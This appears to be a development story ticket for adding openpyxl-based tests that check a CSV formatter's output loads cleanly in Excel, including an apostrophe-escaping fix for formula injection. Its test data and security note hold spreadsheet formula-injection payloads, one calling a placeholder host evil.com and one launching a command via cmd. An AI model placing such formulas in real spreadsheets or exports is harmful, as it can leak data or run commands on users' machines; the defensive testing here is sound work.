# Story: Add Excel Import Validation Test

**Epic:** Epic 3 - Chunk & Output
**Story ID:** 3.10 (Follow-up to Story 3.6)
**Priority:** P1 (MEDIUM)
**Effort:** 45 minutes
**Status:** todo

## Overview

Add automated Excel import validation test to complement existing CSV parser validation. AC-3.6-4 requires validation that CSV output loads cleanly into Excel, but current test coverage only validates pandas/Python csv/csvkit. Excel is the primary use case for auditors, so direct validation adds confidence beyond RFC 4180 compliance.

## Problem Statement

CSV output is validated with 3 parsers (Python csv, pandas, csvkit), but Excel import remains manual UAT. Since Excel is the primary tool for auditors analyzing chunks, automated Excel validation ensures the CSV format is truly auditor-ready. While RFC 4180 compliance guarantees Excel compatibility, direct validation catches edge cases (e.g., encoding issues, formula injection, special characters).

## User Story

**As an** auditor
**I want** CSV output to load cleanly into Excel without manual cleanup
**So that** I can immediately pivot, filter, and analyze chunk data

## Acceptance Criteria

### AC-3.10-1 (P1 - Critical): Excel Import via openpyxl
- **Given:** CSV file generated by CsvFormatter
- **When:** File loaded via openpyxl (Excel library)
- **Then:** Workbook loads without errors
- **And:** All 10 columns present with correct headers
- **And:** All rows accessible (no parsing errors)
- **UAT Required:** No (automated test)

### AC-3.10-2 (P1): Schema Validation in Excel
- **Given:** Loaded Excel workbook
- **When:** Schema inspected
- **Then:** Column headers match canonical schema (chunk_id, source_file, section_context, chunk_text, entity_tags, quality_score, word_count, token_count, processing_version, warnings)
- **And:** Cell data types correct (text for chunk_id, numeric for quality_score/word_count/token_count)
- **UAT Required:** No

### AC-3.10-3 (P1): Special Character Handling
- **Given:** CSV with special characters (commas, quotes, newlines, emoji, Chinese, Arabic)
- **When:** Loaded into Excel
- **Then:** All special characters preserved correctly (no corruption)
- **UAT Required:** No

### AC-3.10-4 (P2): Formula Injection Prevention
- **Given:** CSV with potentially dangerous content (e.g., `=SUM(A1:A10)`, `@IMPORTXML()`)
- **When:** Loaded into Excel
- **Then:** Content treated as text (not executed as formula)
- **Note:** CsvFormatter should escape leading `=`, `+`, `-`, `@` to prevent formula injection
- **UAT Required:** No

## Technical Approach

**Test File:** `tests/integration/test_output/test_csv_compatibility.py`

**Test Function:** `test_excel_import_validation`

**Dependencies:**
- Install `openpyxl` library: `pip install openpyxl`
- Add to `pyproject.toml`: `openpyxl = "^3.1.0"`

**Implementation Steps:**
1. Generate CSV file using CsvFormatter
2. Convert CSV to Excel using openpyxl:
   ```python
   from openpyxl import Workbook, load_workbook
   from csv import reader

   def csv_to_excel(csv_path: Path, xlsx_path: Path):
       wb = Workbook()
       ws = wb.active
       with open(csv_path, 'r', encoding='utf-8-sig') as f:
           for row in reader(f):
               ws.append(row)
       wb.save(xlsx_path)
   ```
3. Load Excel file and validate schema
4. Test special character preservation
5. Test formula injection prevention

**Test Pattern:**
```python
def test_excel_import_validation(tmp_path, sample_chunks):
    # Given: CSV file generated
    csv_path = tmp_path / "output.csv"
    formatter = CsvFormatter()
    formatter.format_chunks(sample_chunks, csv_path)

    # When: Convert to Excel and load
    xlsx_path = tmp_path / "output.xlsx"
    csv_to_excel(csv_path, xlsx_path)
    wb = load_workbook(xlsx_path)
    ws = wb.active

    # Then: Schema validated
    headers = [cell.value for cell in ws[1]]
    expected_headers = [
        "chunk_id", "source_file", "section_context", "chunk_text",
        "entity_tags", "quality_score", "word_count", "token_count",
        "processing_version", "warnings"
    ]
    assert headers == expected_headers

    # And: All rows accessible
    assert ws.max_row >= 2  # Header + at least 1 data row

    # And: Data types correct
    # Row 2 is first data row (row 1 is headers)
    assert isinstance(ws.cell(2, 1).value, str)  # chunk_id is text
    assert isinstance(ws.cell(2, 6).value, (int, float))  # quality_score is numeric

def test_excel_special_characters(tmp_path):
    # Given: Chunk with special characters
    chunk = create_chunk_with_special_chars(
        text='Text with "quotes", commas,\nand newlines. Emoji: ðŸ§ª. Chinese: æµ‹è¯•. Arabic: Ø§Ø®ØªØ¨Ø§Ø±.'
    )

    # When: CSV generated and loaded into Excel
    csv_path = tmp_path / "special.csv"
    CsvFormatter().format_chunks([chunk], csv_path)
    xlsx_path = tmp_path / "special.xlsx"
    csv_to_excel(csv_path, xlsx_path)
    wb = load_workbook(xlsx_path)
    ws = wb.active

    # Then: Special characters preserved
    chunk_text_cell = ws.cell(2, 4).value  # Column 4 is chunk_text
    assert '"quotes"' in chunk_text_cell
    assert ',' in chunk_text_cell
    assert '\n' in chunk_text_cell or '\\n' in chunk_text_cell  # Excel may preserve or escape
    assert 'ðŸ§ª' in chunk_text_cell
    assert 'æµ‹è¯•' in chunk_text_cell
    assert 'Ø§Ø®ØªØ¨Ø§Ø±' in chunk_text_cell

def test_excel_formula_injection_prevention(tmp_path):
    # Given: Chunk with formula-like content
    dangerous_content = [
        "=SUM(A1:A10)",
        "+1234",
        "-9999",
        "@IMPORTXML('http://evil.com/data.xml')"
    ]
    chunks = [create_chunk_with_text(text) for text in dangerous_content]

    # When: CSV generated and loaded into Excel
    csv_path = tmp_path / "formula.csv"
    formatter = CsvFormatter()
    formatter.format_chunks(chunks, csv_path)
    xlsx_path = tmp_path / "formula.xlsx"
    csv_to_excel(csv_path, xlsx_path)
    wb = load_workbook(xlsx_path)
    ws = wb.active

    # Then: Content treated as text (not executed)
    for i, expected in enumerate(dangerous_content, start=2):
        cell_value = ws.cell(i, 4).value  # Column 4 is chunk_text
        # openpyxl should load formulas as strings if properly escaped
        assert isinstance(cell_value, str)
        # Note: CsvFormatter should escape leading =, +, -, @ with apostrophe
        # e.g., "=SUM(A1)" should be written as "'=SUM(A1)" in CSV
```

**Formula Injection Fix (if needed):**
If CsvFormatter doesn't escape formula-leading characters, add this logic:
```python
def escape_formula_injection(text: str) -> str:
    """Escape content that could be interpreted as Excel formulas."""
    if text.startswith(('=', '+', '-', '@')):
        return "'" + text  # Prefix with apostrophe to force text interpretation
    return text
```

## Definition of Done

- [ ] Test added to `tests/integration/test_output/test_csv_compatibility.py`
- [ ] All 4 acceptance criteria covered (Excel import, schema, special chars, formula injection)
- [ ] openpyxl added to pyproject.toml dependencies
- [ ] Test passes in local pytest run
- [ ] Test passes in CI/CD pipeline
- [ ] Formula injection escaping implemented (if not already present)
- [ ] Traceability matrix updated (AC-3.6-4 coverage: PARTIAL â†’ FULL)
- [ ] Pre-commit checks pass (black, ruff, mypy)

## Test Execution

```bash
# Install openpyxl
pip install openpyxl

# Run new tests
pytest tests/integration/test_output/test_csv_compatibility.py::test_excel_import_validation -v
pytest tests/integration/test_output/test_csv_compatibility.py::test_excel_special_characters -v
pytest tests/integration/test_output/test_csv_compatibility.py::test_excel_formula_injection_prevention -v

# Run all CSV tests
pytest tests/integration/test_output/test_csv_*.py -v

# Coverage check
pytest tests/integration/test_output/ --cov=src/data_extract/output --cov-report=html
```

## Dependencies

- Epic 3 Story 3.6 (CSV Output Format) - COMPLETE
- CsvFormatter - EXISTS
- openpyxl library - INSTALL REQUIRED

## Risk Mitigation

**Risk:** openpyxl dependency adds library bloat
**Mitigation:** openpyxl is test-only dependency (not production code), acceptable for Excel validation

**Risk:** Excel formula injection vulnerability
**Mitigation:** Implement escaping of leading `=`, `+`, `-`, `@` characters

## Related Artifacts

- Traceability Matrix: `docs/traceability-matrix-epic-3.md` (Gap 3)
- Story 3.6: `docs/stories/3-6-csv-output-format-for-analysis-and-tracking.md`
- Test File: `tests/integration/test_output/test_csv_compatibility.py`
- CSV Formatter: `src/data_extract/output/formatters/csv_formatter.py`

## Notes

This story adds automated Excel validation to complement existing pandas/Python csv/csvkit validation. Excel is the primary tool for auditors, so direct validation ensures CSV output is truly auditor-ready. Google Sheets remains manual UAT (requires API access).

**Security Note:** Formula injection is a known CSV vulnerability where malicious content like `=cmd|'/c calc'!A1` could execute commands when opened in Excel. This story includes prevention via apostrophe-prefixing.

---

**Created:** 2025-11-17
**Workflow:** testarch-trace Phase 1 follow-up
**Agent:** Murat (TEA)
